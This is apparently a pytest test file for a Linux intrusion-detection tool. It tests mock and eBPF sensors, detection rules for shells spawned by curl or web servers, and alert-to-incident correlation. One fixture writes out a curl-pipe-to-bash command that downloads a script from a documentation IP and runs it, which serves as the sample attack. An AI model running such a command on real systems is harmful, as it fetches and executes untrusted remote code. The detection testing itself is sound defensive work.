"""Sensor interface, mock sensor, registry, loader diagnostics, CLI and the
full mock -> event -> alert -> incident integration path.

Everything runs unprivileged with no kernel involvement.
"""

import json
from types import SimpleNamespace

import pytest

from sentinelforge.cli import build_parser, run_sensor, run_sensor_check, run_sensor_list
from sentinelforge.correlation.engine import CorrelationEngine
from sentinelforge.detection.engine import DetectionEngine
from sentinelforge.detection.rules import (
    SuspiciousNetworkConnectionRule,
    SuspiciousProcessExecutionRule,
)
from sentinelforge.models.event import EventType, SecurityEvent, Severity
from sentinelforge.sensors import (
    SENSOR_NAMES,
    MockSensor,
    Sensor,
    SensorUnavailableError,
    build_sensor,
    sensor_statuses,
)
from sentinelforge.sensors.ebpf import loader


# ==========================================================================
# Sensor interface
# ==========================================================================
class CountingSensor(Sensor):
    """A minimal sensor used to exercise the base-class contract."""

    name = "counting"
    source = "test"

    def __init__(self, count=3):
        super().__init__(host="fedora")
        self.count = count
        self.started = 0
        self.stopped = 0

    def start(self):
        self.started += 1
        super().start()

    def stop(self):
        self.stopped += 1
        super().stop()

    def events(self):
        for index in range(self.count):
            if not self.running:
                return
            yield SecurityEvent(message=f"event {index}", source=self.source)


class TestSensorInterface:
    def test_start_and_stop_toggle_running(self):
        sensor = CountingSensor()
        assert sensor.running is False
        sensor.start()
        assert sensor.running is True
        sensor.stop()
        assert sensor.running is False

    def test_context_manager_starts_and_stops(self):
        sensor = CountingSensor()
        with sensor:
            assert sensor.running is True
        assert sensor.stopped == 1

    def test_collect_respects_a_limit_and_always_stops(self):
        sensor = CountingSensor(count=100)
        events = sensor.collect(limit=2)
        assert len(events) == 2
        assert sensor.running is False

    def test_iteration_yields_events(self):
        sensor = CountingSensor(count=2)
        sensor.start()
        assert len(list(sensor)) == 2

    def test_stopping_mid_stream_ends_iteration(self):
        sensor = CountingSensor(count=100)
        sensor.start()
        produced = []
        for event in sensor.events():
            produced.append(event)
            sensor.stop()
        assert len(produced) == 1

    def test_default_status_is_available(self):
        assert CountingSensor.status().available is True
        assert CountingSensor.available() is True


# ==========================================================================
# Mock sensor
# ==========================================================================
class TestMockSensor:
    def test_produces_the_documented_scenario(self):
        events = MockSensor().collect()
        assert [event.event_type for event in events] == [
            EventType.PROCESS_START,
            EventType.PROCESS_START,
            EventType.NETWORK_CONNECTION,
            EventType.PROCESS_START,
        ]
        assert [event.process for event in events] == ["bash", "curl", "curl", "sh"]

    def test_process_lineage_is_present(self):
        events = MockSensor().collect()
        lineage = {(e.process, e.parent_process) for e in events if e.ppid}
        assert ("bash", "sshd") in lineage
        assert ("curl", "bash") in lineage
        assert ("sh", "curl") in lineage

    def test_network_event_carries_connection_metadata(self):
        network = [e for e in MockSensor().collect() if e.event_type == EventType.NETWORK_CONNECTION]
        assert len(network) == 1
        assert network[0].dst_ip == "198.51.100.9"
        assert network[0].dst_port == 443
        assert network[0].protocol == "tcp"

    def test_synthetic_telemetry_is_clearly_labelled(self):
        """Mock events must never be mistakable for real kernel telemetry."""
        for event in MockSensor().collect():
            assert event.source == "mock"
            assert event.metadata["synthetic"] is True

    def test_output_is_deterministic(self):
        first = [event.to_json() for event in MockSensor().collect()]
        second = [event.to_json() for event in MockSensor().collect()]
        assert first == second

    def test_timestamps_are_ordered(self):
        stamps = [event.timestamp for event in MockSensor().collect()]
        assert stamps == sorted(stamps)

    def test_repeat_cycles_the_scenario_without_repeating_timestamps(self):
        events = MockSensor(repeat=3).collect()
        assert len(events) == 12
        stamps = [event.timestamp for event in events]
        assert len(set(stamps)) == len(stamps)

    def test_endless_mode_stops_when_asked(self):
        sensor = MockSensor(repeat=0)
        events = sensor.collect(limit=10)
        assert len(events) == 10
        assert sensor.running is False

    def test_events_are_serializable(self):
        for event in MockSensor().collect():
            data = json.loads(event.to_json())
            assert data["source"] == "mock"
            assert "metadata" in data


# ==========================================================================
# Registry
# ==========================================================================
class TestRegistry:
    def test_every_documented_sensor_is_registered(self):
        assert set(SENSOR_NAMES) == {
            "journal",
            "file",
            "ebpf-process",
            "ebpf-network",
            "mock",
        }

    def test_statuses_never_raise(self):
        statuses = sensor_statuses()
        assert len(statuses) == len(SENSOR_NAMES)
        for status in statuses:
            assert isinstance(status.available, bool)
            if not status.available:
                assert status.reason

    def test_build_sensor_by_name(self):
        assert isinstance(build_sensor("mock"), MockSensor)

    def test_unknown_sensor_names_are_rejected(self):
        with pytest.raises(KeyError, match="unknown sensor"):
            build_sensor("definitely-not-a-sensor")

    def test_log_collectors_are_exposed_as_sensors(self):
        """Phase 1 collectors are reused, not reimplemented."""
        from sentinelforge.sensors.registry import FileSensor, JournalSensor

        assert JournalSensor.source == "systemd-journal"
        assert FileSensor.source == "logfile"


# ==========================================================================
# eBPF availability / error handling (no kernel needed)
# ==========================================================================
class TestEbpfDiagnostics:
    def test_missing_bcc_is_reported_with_install_instructions(self, monkeypatch):
        monkeypatch.setattr(loader, "bcc_version", lambda: None)
        monkeypatch.setattr(loader, "system_bcc_path", lambda: None)
        support = loader.check_ebpf_support(require_privileges=False)
        assert support.supported is False
        assert "BCC" in support.reason
        assert "dnf install" in support.remedy

    def test_bcc_hidden_by_a_virtualenv_gets_a_targeted_remedy(self, monkeypatch):
        monkeypatch.setattr(loader, "bcc_version", lambda: None)
        monkeypatch.setattr(loader, "system_bcc_path", lambda: "/usr/lib/python3/site-packages/bcc")
        monkeypatch.setattr(loader, "in_virtualenv", lambda: True)
        support = loader.check_ebpf_support(require_privileges=False)
        assert "virtual environment" in support.reason
        assert "--system-site-packages" in support.remedy

    def test_insufficient_privileges_are_reported_without_escalating(self, monkeypatch):
        monkeypatch.setattr(loader, "bcc_version", lambda: "0.30.0")
        monkeypatch.setattr(loader, "has_bpf_privileges", lambda: False)
        support = loader.check_ebpf_support()
        assert support.supported is False
        assert "privileges" in support.reason
        assert "sudo" in support.remedy  # told to the user, never executed

    def test_old_kernels_are_reported(self, monkeypatch):
        monkeypatch.setattr(loader, "bcc_version", lambda: "0.30.0")
        monkeypatch.setattr(loader, "kernel_version", lambda: (4, 4))
        monkeypatch.setattr(loader, "has_bpf_privileges", lambda: True)
        support = loader.check_ebpf_support()
        assert any("older than" in reason for reason in support.reasons)

    def test_require_ebpf_raises_when_unsupported(self, monkeypatch):
        monkeypatch.setattr(
            loader,
            "check_ebpf_support",
            lambda: loader.EbpfSupport(supported=False, reasons=["nope"], remedy="fix it"),
        )
        with pytest.raises(SensorUnavailableError):
            loader.require_ebpf()

    def test_support_check_is_read_only(self):
        """Probing must not change anything on the system."""
        before = loader.check_ebpf_support().to_dict()
        after = loader.check_ebpf_support().to_dict()
        assert before == after

    def test_boot_clock_maps_kernel_timestamps(self):
        clock = loader.BootClock()
        assert clock.to_datetime(clock.monotonic_ns) is not None
        assert clock.to_datetime(None) is not None  # never raises
        assert clock.to_datetime(0) is not None


# ==========================================================================
# Detections that need sensor telemetry
# ==========================================================================
def process_event(process, parent, command=None, **meta):
    metadata = {"pid": 100, "ppid": 99, "parent_process": parent, "command_line": command}
    metadata.update(meta)
    return SecurityEvent(
        timestamp="2026-09-12T12:30:00Z",
        host="fedora",
        source="ebpf",
        event_type=EventType.PROCESS_START,
        severity=Severity.INFO,
        user="capslock",
        process=process,
        message=f"Process executed: {command or process}",
        metadata=metadata,
    )


def network_event(process, destination, port=443):
    return SecurityEvent(
        timestamp="2026-09-12T12:30:03Z",
        host="fedora",
        source="ebpf",
        event_type=EventType.NETWORK_CONNECTION,
        severity=Severity.INFO,
        user="capslock",
        process=process,
        message=f"{process} connected to {destination}:{port}",
        metadata={"pid": 100, "destination_ip": destination, "destination_port": port,
                  "protocol": "tcp"},
    )


class TestTelemetryDetections:
    @pytest.mark.parametrize(
        "child,parent",
        [("sh", "curl"), ("bash", "nginx"), ("dash", "httpd"), ("sh", "php-fpm")],
    )
    def test_shell_from_an_unexpected_parent_alerts(self, child, parent):
        detections = list(
            SuspiciousProcessExecutionRule().evaluate([process_event(child, parent)])
        )
        assert len(detections) == 1
        assert parent in detections[0].description

    @pytest.mark.parametrize(
        "child,parent",
        [
            ("bash", "sshd"),        # a normal interactive login
            ("bash", "systemd"),     # a service starting a script
            ("curl", "bash"),        # a user running curl
            ("python3", "systemd"),  # a service
            ("sh", "make"),          # a build
        ],
    )
    def test_ordinary_lineage_does_not_alert(self, child, parent):
        assert list(SuspiciousProcessExecutionRule().evaluate([process_event(child, parent)])) == []

    def test_events_without_lineage_metadata_are_ignored(self):
        event = SecurityEvent(event_type=EventType.PROCESS_START, process="sh")
        assert list(SuspiciousProcessExecutionRule().evaluate([event])) == []

    def test_rule_declares_the_metadata_it_needs(self):
        rule = SuspiciousProcessExecutionRule()
        assert rule.requires == ("parent_process",)
        assert rule.unavailable_reason([SecurityEvent(message="a log line")])

    def test_shell_connecting_out_alerts(self):
        detections = list(
            SuspiciousNetworkConnectionRule().evaluate([network_event("bash", "198.51.100.9")])
        )
        assert len(detections) == 1
        assert detections[0].source_ip == "198.51.100.9"
        assert detections[0].mitre is None  # uses the rule's own mapping

    def test_normal_network_clients_do_not_alert(self):
        for process in ("curl", "firefox", "dnf", "sshd"):
            assert list(
                SuspiciousNetworkConnectionRule().evaluate([network_event(process, "198.51.100.9")])
            ) == []

    def test_internal_destinations_do_not_alert(self):
        for destination in ("127.0.0.1", "10.0.0.5", "192.168.1.10", "::1"):
            assert list(
                SuspiciousNetworkConnectionRule().evaluate([network_event("bash", destination)])
            ) == []

    def test_network_rule_is_skipped_without_telemetry(self):
        rule = SuspiciousNetworkConnectionRule()
        reason = rule.unavailable_reason([SecurityEvent(message="a log line")])
        assert reason and "ebpf-network" in reason


# ==========================================================================
# Integration: mock sensor -> events -> alerts -> incident
# ==========================================================================
class TestIntegration:
    def test_mock_telemetry_flows_through_detection_and_correlation(self):
        # Explicit host, not the machine's own: this must be a deterministic,
        # portable fixture, not an assertion that happens to hold only on the
        # one machine it was written on (found by Phase 9.2's fresh-container
        # validation - MockSensor() with no host falls back to the real
        # socket.gethostname(), so this test failed on any host not literally
        # named 'fedora').
        events = MockSensor(host="fedora").collect()

        alerts = DetectionEngine().run(events)
        assert alerts, "the curl -> sh lineage should raise an alert"
        assert any(alert.rule_id == "SUSPICIOUS_PROCESS_EXECUTION" for alert in alerts)

        incidents = CorrelationEngine().run(alerts)
        assert len(incidents) == 1
        incident = incidents[0]
        assert incident.host == "fedora"
        assert incident.alert_count == len(alerts)
        assert incident.timeline
        assert incident.attack_chain

    def test_detection_engine_needs_no_source_specific_branches(self):
        """The same engine call handles log events and sensor events together."""
        from conftest import failed_ssh

        mixed = [failed_ssh(i * 20) for i in range(5)] + MockSensor().collect()
        engine = DetectionEngine()
        alerts = engine.run(mixed)
        rule_ids = {alert.rule_id for alert in alerts}
        assert "SSH_BRUTE_FORCE" in rule_ids          # from journald-shaped events
        assert "SUSPICIOUS_PROCESS_EXECUTION" in rule_ids  # from sensor events
        assert engine.stats.events_skipped == 0

    def test_port_scan_rule_runs_once_network_telemetry_exists(self):
        events = [
            network_event("nmap", "198.51.100.9", port=port)
            for port in (21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080)
        ]
        for index, event in enumerate(events):
            event.src_ip = "192.168.1.20"
            event.timestamp = f"2026-09-12T12:30:{index:02d}Z"
        engine = DetectionEngine()
        alerts = engine.run(events)
        assert any(alert.rule_id == "PORT_SCAN" for alert in alerts)
        assert "PORT_SCAN" not in engine.stats.rules_skipped

    def test_telemetry_extends_an_authentication_incident(self):
        """eBPF alerts join the existing incident rather than starting a parallel one."""
        from conftest import failed_ssh, successful_ssh, sudo_event

        events = [failed_ssh(i * 60, user="capslock") for i in range(5)]
        events.append(successful_ssh(300, user="capslock"))
        events.append(sudo_event(420, "/usr/bin/curl http://198.51.100.9/x.sh | bash"))
        events.append(
            process_event("sh", "curl", command="sh", pid=4102, ppid=4101)
        )
        events[-1].timestamp = "2026-09-12T10:38:00Z"
        events[-1].user = "capslock"

        alerts = DetectionEngine().run(events)
        incidents = CorrelationEngine().run(alerts)

        assert len(incidents) == 1
        incident = incidents[0]
        assert "SUSPICIOUS_PROCESS_EXECUTION" in incident.rule_ids
        assert "SSH_BRUTE_FORCE" in incident.rule_ids
        assert incident.severity == "critical"

    def test_a_failing_sensor_does_not_break_the_rest_of_the_pipeline(self):
        """Graceful degradation: eBPF unavailable, everything else still works."""
        from conftest import failed_ssh

        with pytest.raises(SensorUnavailableError):
            raise SensorUnavailableError("eBPF unavailable", "run with sudo")

        alerts = DetectionEngine().run([failed_ssh(i * 20) for i in range(5)])
        assert alerts
        assert CorrelationEngine().run(alerts)


# ==========================================================================
# CLI
# ==========================================================================
class TestSensorCli:
    def test_sensor_list_shows_every_sensor(self, capsys):
        assert run_sensor_list(build_parser().parse_args(["sensor", "list"])) == 0
        output = capsys.readouterr().out
        for name in SENSOR_NAMES:
            assert name in output
        assert "Available sensors:" in output

    def test_sensor_list_explains_unavailable_sensors(self, capsys, monkeypatch):
        from sentinelforge.sensors.base import SensorStatus

        monkeypatch.setattr(
            "sentinelforge.cli.sensor_statuses",
            lambda: [SensorStatus(name="ebpf-process", available=False, reason="no privileges")],
        )
        run_sensor_list(build_parser().parse_args(["sensor", "list"]))
        output = capsys.readouterr().out
        assert "UNAVAILABLE" in output
        assert "no privileges" in output

    def test_sensor_check_reports_details(self, capsys):
        args = build_parser().parse_args(["sensor", "check"])
        code = run_sensor_check(args)
        output = capsys.readouterr().out
        assert "eBPF support check" in output
        assert "kernel" in output
        assert code in (0, 1)  # 1 when unprivileged, which is the usual case

    def test_sensor_start_mock_writes_jsonl(self, tmp_path, capsys):
        out = tmp_path / "telemetry.jsonl"
        args = build_parser().parse_args(
            ["sensor", "start", "mock", "--output", str(out), "--limit", "4"]
        )
        assert run_sensor(args) == 0
        events = [json.loads(line) for line in out.read_text().splitlines()]
        assert len(events) == 4
        assert {event["source"] for event in events} == {"mock"}

    def test_sensor_start_respects_a_limit(self, capsys):
        args = build_parser().parse_args(["sensor", "start", "mock", "--limit", "2"])
        assert run_sensor(args) == 0
        assert len(capsys.readouterr().out.strip().splitlines()) == 2

    def test_sensor_start_reports_permission_problems_without_faking_data(
        self, monkeypatch, capsys
    ):
        """Asking for eBPF must never silently yield mock events."""

        def unavailable(self):
            raise SensorUnavailableError(
                "insufficient privileges: need root, or CAP_BPF and CAP_PERFMON",
                "Run the sensor yourself with: sudo sentinelforge sensor start ebpf-process",
            )

        monkeypatch.setattr(
            "sentinelforge.sensors.ebpf.process.EbpfProcessSensor.start", unavailable
        )
        args = build_parser().parse_args(["sensor", "start", "ebpf-process"])
        assert run_sensor(args) == 1

        captured = capsys.readouterr()
        assert captured.out.strip() == ""  # no events at all, real or fake
        assert "sudo sentinelforge sensor start ebpf-process" in captured.err

    def test_sensor_start_rejects_unknown_names(self):
        with pytest.raises(SystemExit):
            build_parser().parse_args(["sensor", "start", "not-a-sensor"])

    def test_no_args_flag_disables_argument_capture(self):
        from sentinelforge.cli import _sensor_options

        args = SimpleNamespace(name="ebpf-process", no_args=True, uid=None, limit=None, duration=None)
        assert _sensor_options(args)["capture_args"] is False

        args.no_args = False
        assert _sensor_options(args)["capture_args"] is True

    def test_bench_reports_throughput(self, capsys):
        args = build_parser().parse_args(["sensor", "bench", "mock", "--count", "500"])
        assert run_sensor(args) == 0
        output = capsys.readouterr().out
        assert "events/second" in output
        assert "events        : 500" in output
        assert "kernel drops  : 0" in output
